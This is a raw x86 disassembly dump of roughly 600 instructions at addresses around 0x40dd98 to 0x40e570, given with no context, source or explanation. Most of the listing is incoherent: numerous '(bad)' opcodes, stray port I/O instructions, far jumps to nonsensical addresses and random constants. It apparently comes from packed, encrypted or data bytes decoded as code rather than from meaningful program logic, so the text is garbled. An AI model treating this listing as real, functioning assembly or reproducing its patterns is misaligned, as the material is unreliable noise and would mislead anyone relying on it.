  40dd98:	push   0x70
  40dd9a:	jae    0x40dd58
  40dd9c:	test   eax,0x114c7867
  40dda1:	mov    al,ds:0x71016631
  40dda6:	stc    
  40dda7:	push   es
  40dda8:	push   edx
  40dda9:	push   cs
  40ddaa:	push   eax
  40ddab:	xor    BYTE PTR [esi+ebp*8-0x5dcd02dc],0xbf
  40ddb3:	ja     0x40dd6f
  40ddb5:	aam    0x30
  40ddb7:	fdivrp st(6),st
  40ddb9:	dec    ebp
  40ddba:	push   0xffffffdd
  40ddbc:	fild   QWORD PTR [eax-0x18a09541]
  40ddc2:	sbb    al,0x83
  40ddc4:	sub    BYTE PTR [edi+0x202571a9],bl
  40ddca:	data16 jno 0x40dda4
  40ddcd:	mov    edx,0x485bc3b8
  40ddd2:	add    eax,DWORD PTR [edx]
  40ddd4:	in     al,0x39
  40ddd6:	pop    ecx
  40ddd7:	jno    0x40ddf0
  40ddd9:	xchg   esp,eax
  40ddda:	inc    ebx
  40dddb:	sbb    ecx,ebp
  40dddd:	sbb    al,BYTE PTR ds:0x46090911
  40dde3:	sub    dh,dh
  40dde5:	cmp    ah,BYTE PTR [ebx+0x6e]
  40dde8:	adc    ah,al
  40ddea:	jle    0x40de67
  40ddec:	or     al,0x74
  40ddee:	(bad)  
  40ddf0:	in     eax,dx
  40ddf1:	fmul   DWORD PTR [eax-0x3abcd47b]
  40ddf7:	cmp    eax,DWORD PTR [eax+0x42]
  40ddfa:	xchg   ebp,eax
  40ddfb:	xchg   esp,eax
  40ddfc:	adc    BYTE PTR [ecx+0x3545a0d2],0xe4
  40de03:	inc    ebp
  40de04:	repz arpl WORD PTR [edx],bp
  40de07:	mov    edi,0x574a5fdf
  40de0c:	andnps xmm5,XMMWORD PTR [eax]
  40de0f:	mov    ecx,0x6a590a6a
  40de14:	add    al,0x5b
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0x445f148d
  40de2d:	in     eax,0xc6
  40de2f:	xchg   BYTE PTR [esi+0x7e],bh
  40de32:	aas    
  40de33:	jg     0x40deb3
  40de35:	jle    0x40de3d
  40de37:	xor    ecx,DWORD PTR [ebx]
  40de39:	mov    dl,0x36
  40de3b:	bound  esi,QWORD PTR [ecx]
  40de3d:	enter  0x6d80,0x83
  40de41:	in     al,0xa5
  40de43:	fld    TBYTE PTR [esi+0xc54b1]
  40de49:	push   cs
  40de4a:	cmp    ecx,DWORD PTR [ecx+eiz*1]
  40de4d:	fld    TBYTE PTR [esi]
  40de4f:	stc    
  40de50:	pop    esi
  40de51:	je     0x40de32
  40de53:	fdivr  st,st(4)
  40de55:	pop    edi
  40de56:	push   es
  40de57:	jmp    0x40dec6
  40de59:	out    dx,al
  40de5a:	add    BYTE PTR [ebp+0x62],dl
  40de5d:	sbb    DWORD PTR [eax+edx*8],edi
  40de60:	add    eax,0x9d0ccf5d
  40de65:	in     al,dx
  40de66:	pop    es
  40de67:	add    ebx,esi
  40de69:	xor    al,0x53
  40de6b:	xchg   ebx,eax
  40de6c:	aad    0xe7
  40de6e:	and    DWORD PTR [esi+edx*1+0x71],eax
  40de72:	test   ebp,0x77437f11
  40de78:	lds    edi,FWORD PTR [edx+0x66]
  40de7b:	jl     0x40de1f
  40de7d:	fidivr DWORD PTR [eax+0x1a]
  40de80:	sahf   
  40de81:	addr16 or al,0x11
  40de84:	lods   eax,DWORD PTR ds:[esi]
  40de85:	push   esi
  40de86:	mov    bh,0x1b
  40de88:	xchg   BYTE PTR [esi],bl
  40de8a:	outs   dx,BYTE PTR ds:[esi]
  40de8b:	adc    BYTE PTR [esi],0x49
  40de8e:	popa   
  40de8f:	jmp    0x40df05
  40de91:	add    eax,0x52f3030d
  40de96:	loop   0x40df0d
  40de98:	div    BYTE PTR [ebp-0x1786ed82]
  40de9e:	test   al,0xcc
  40dea0:	mov    ebp,0xb358f04c
  40dea5:	xor    eax,0xc2ff909e
  40deaa:	jg     0x40deb2
  40deac:	out    dx,eax
  40dead:	jo     0x40dec4
  40deaf:	iret   
  40deb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deb1:	das    
  40deb2:	(bad)  
  40deb3:	jl     0x40defa
  40deb5:	pop    edi
  40deb6:	fstp   QWORD PTR [ecx]
  40deb8:	shl    BYTE PTR [eax-0x41f88946],1
  40debe:	es jge 0x40df21
  40dec1:	and    eax,0x4b441d02
  40dec6:	int    0xc2
  40dec8:	or     eax,0x9c8ac7d
  40decd:	xchg   esp,eax
  40dece:	out    dx,al
  40decf:	fimul  DWORD PTR [esi]
  40ded1:	dec    esp
  40ded2:	(bad)  
  40ded4:	xchg   bh,al
  40ded6:	dec    esp
  40ded7:	popa   
  40ded8:	or     bh,BYTE PTR [edx]
  40deda:	xchg   BYTE PTR [edx+0x65],al
  40dedd:	imul   ecx,DWORD PTR [ecx+0x59],0xffffffe7
  40dee1:	mov    ebp,0x78a6a987
  40dee6:	dec    edx
  40dee7:	mov    eax,0x77ce506e
  40deec:	or     dl,BYTE PTR [edx-0x23]
  40deef:	cli    
  40def0:	out    0xa8,eax
  40def2:	fisttp DWORD PTR [ecx-0x10]
  40def5:	mov    ah,0x41
  40def7:	mov    ds:0x66e3295d,eax
  40defc:	jmp    0xf41129c2
  40df01:	cdq    
  40df02:	or     BYTE PTR [ecx+0x66359de1],dh
  40df08:	into   
  40df09:	aam    0xbb
  40df0b:	push   esp
  40df0c:	pop    esi
  40df0d:	(bad)  
  40df0e:	cs add al,0x3a
  40df11:	sub    DWORD PTR [esi],esi
  40df13:	sub    esi,DWORD PTR [ebx]
  40df15:	add    BYTE PTR [esi+0x52],bl
  40df18:	xor    bh,ch
  40df1a:	cli    
  40df1b:	stos   DWORD PTR es:[edi],eax
  40df1c:	pop    eax
  40df1d:	pop    ds
  40df1e:	js     0x40df60
  40df20:	mov    ch,0x4c
  40df22:	xchg   esp,eax
  40df23:	pop    edi
  40df24:	jnp    0x40df7a
  40df26:	ja     0x40df74
  40df28:	lods   eax,DWORD PTR ds:[esi]
  40df29:	inc    edi
  40df2a:	sbb    eax,0x5ab111a6
  40df2f:	fnstsw WORD PTR [edi-0x39]
  40df32:	or     DWORD PTR [esi],eax
  40df34:	fwait
  40df35:	in     al,0x57
  40df37:	mov    WORD PTR ds:0x46cee37,?
  40df3d:	int    0x10
  40df3f:	add    al,0x49
  40df41:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40df43:	jmp    0x5b2f3073
  40df48:	(bad)  
  40df49:	jmp    0xf26c6929
  40df4e:	push   ds
  40df4f:	xor    BYTE PTR [ebx],bh
  40df51:	mov    gs,WORD PTR [esi+0x5a94ed49]
  40df57:	das    
  40df58:	mov    ch,0xd7
  40df5a:	push   es
  40df5b:	xchg   edi,eax
  40df5c:	into   
  40df5d:	pop    esi
  40df5e:	loopne 0x40df0f
  40df60:	xchg   DWORD PTR [edx+0x4e096c6],ebp
  40df66:	mov    bl,0x2c
  40df68:	and    esp,ecx
  40df6a:	pop    ds
  40df6b:	dec    esi
  40df6c:	scas   al,BYTE PTR es:[edi]
  40df6d:	adc    BYTE PTR [edx-0x31],0xd0
  40df71:	int    0xa3
  40df73:	loopne 0x40df87
  40df75:	add    bh,ah
  40df77:	sub    ebx,ecx
  40df79:	xchg   ebx,ecx
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	rcl    DWORD PTR [ebp+edx*2-0x7b],1
  40dfaa:	inc    esi
  40dfab:	xchg   DWORD PTR [edi+0x7f3f7e7e],eax
  40dfb1:	jle    0x40e031
  40dfb3:	xor    esp,esp
  40dfb5:	inc    esp
  40dfb6:	mov    WORD PTR gs:[ebp+0x5e04b151],cx
  40dfbe:	(bad)  
  40dfbf:	ss mov dl,0x24
  40dfc2:	aas    
  40dfc3:	xor    esi,DWORD PTR [ecx+0x5b0da010]
  40dfc9:	jae    0x40dfe3
  40dfcb:	pop    ecx
  40dfcc:	ds std 
  40dfce:	jnp    0x40dfb8
  40dfd0:	jmp    0xd25bd7aa
  40dfd5:	mov    ds,WORD PTR [esi+ecx*1-0x24]
  40dfd9:	xor    eax,0xc91556f6
  40dfde:	push   ds
  40dfdf:	test   eax,0x8d50aea5
  40dfe4:	sti    
  40dfe5:	cdq    
  40dfe6:	push   ss
  40dfe7:	test   al,0x22
  40dfe9:	jp     0x40dfa1
  40dfeb:	pushf  
  40dfec:	xor    eax,0xb344f02a
  40dff1:	add    bl,bh
  40dff3:	fcmove st,st(7)
  40dff5:	mov    bl,BYTE PTR [ebp-0x4b]
  40dff8:	adc    DWORD PTR [edx-0x7c],edi
  40dffb:	jmp    0xb4c9ac0f
  40e000:	popf   
  40e001:	cmp    esp,DWORD PTR [edx-0x19]
  40e004:	add    bl,BYTE PTR [ebx-0x87d00ed]
  40e00a:	fnstenv [ebp+0x6134a3a8]
  40e010:	xchg   ecx,eax
  40e011:	cmp    al,0x65
  40e013:	xchg   esp,eax
  40e014:	stos   DWORD PTR es:[edi],eax
  40e015:	jne    0x40e030
  40e017:	sti    
  40e018:	jg     0x40dfbc
  40e01a:	pop    ebx
  40e01b:	je     0x40e009
  40e01d:	jg     0x40e02e
  40e01f:	pop    ecx
  40e020:	into   
  40e021:	mov    dh,0x91
  40e023:	les    edi,FWORD PTR ds:0x43fcb5c0
  40e029:	jle    0x40e023
  40e02b:	sti    
  40e02c:	fdivr  st(5),st
  40e02e:	lea    edi,[edx+esi*1-0x50572c60]
  40e035:	mov    ebx,0xc8dda79e
  40e03a:	rcr    BYTE PTR [edx-0x21064a78],0xa9
  40e041:	sti    
  40e042:	mov    dl,0x14
  40e044:	ss xchg ebp,eax
  40e046:	mov    edi,0xc7f1af11
  40e04b:	push   ebx
  40e04c:	pusha  
  40e04d:	and    ebx,DWORD PTR [eax+0x1c25a80e]
  40e053:	adc    al,0xb7
  40e055:	data16 ja 0x40e019
  40e058:	shl    BYTE PTR [ecx-0x35b22c74],1
  40e05e:	call   0x5317f715
  40e063:	shl    al,1
  40e065:	jae    0x40e008
  40e067:	sbb    al,0xd9
  40e069:	push   edx
  40e06a:	sbb    dh,BYTE PTR [edx]
  40e06c:	push   edx
  40e06d:	inc    esi
  40e06e:	stos   BYTE PTR es:[edi],al
  40e06f:	mov    eax,0xac22d493
  40e074:	rcr    edx,0x0
  40e077:	sbb    esi,DWORD PTR [ecx]
  40e079:	sbb    bh,BYTE PTR [edi]
  40e07b:	fs push ds
  40e07d:	addr16 sbb eax,0xe48394ba
  40e083:	mov    dh,BYTE PTR [ecx-0x43]
  40e086:	adc    DWORD PTR [ebp-0x66d9dab2],0xffffff84
  40e08d:	push   eax
  40e08e:	sub    al,ah
  40e090:	cmc    
  40e091:	shl    DWORD PTR [ecx],1
  40e093:	sub    DWORD PTR [edi-0x3dd76f48],0xffffffb3
  40e09a:	enter  0xd401,0x21
  40e09e:	inc    ebx
  40e0a0:	std    
  40e0a1:	add    eax,DWORD PTR [ebx+0x2e412345]
  40e0a7:	mov    esp,DWORD PTR [ecx-0x61]
  40e0aa:	jbe    0x40e08f
  40e0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0ad:	clc    
  40e0ae:	jmp    0x9a139de5
  40e0b3:	shl    DWORD PTR [edx+0x23],0x20
  40e0b7:	jle    0x40e07f
  40e0b9:	inc    esp
  40e0ba:	ficomp DWORD PTR [edi+ecx*1+0x6d7903fb]
  40e0c1:	es in  al,0x57
  40e0c4:	adc    DWORD PTR [eax+0x6],edi
  40e0c7:	dec    edi
  40e0c8:	jo     0x40e0ea
  40e0ca:	xor    ch,BYTE PTR [edi-0x5f]
  40e0cd:	pop    ecx
  40e0ce:	xchg   esp,eax
  40e0cf:	jg     0x40e067
  40e0d1:	adc    dh,cl
  40e0d3:	inc    edx
  40e0d4:	call   0xc9e61da8
  40e0d9:	nop
  40e0da:	push   ebx
  40e0db:	das    
  40e0dc:	fucom  st(4)
  40e0de:	lea    edi,[edi+0x20]
  40e0e1:	mov    ds:0x1ebe6c36,eax
  40e0e6:	jmp    0x40e15f
  40e0e8:	int3   
  40e0e9:	cdq    
  40e0ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0eb:	xchg   edi,eax
  40e0ec:	push   ebp
  40e0ed:	out    dx,eax
  40e0ee:	loopne 0x40e097
  40e0f0:	(bad)  
  40e0f1:	(bad)  
  40e0f3:	or     eax,0x5ff4458b
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
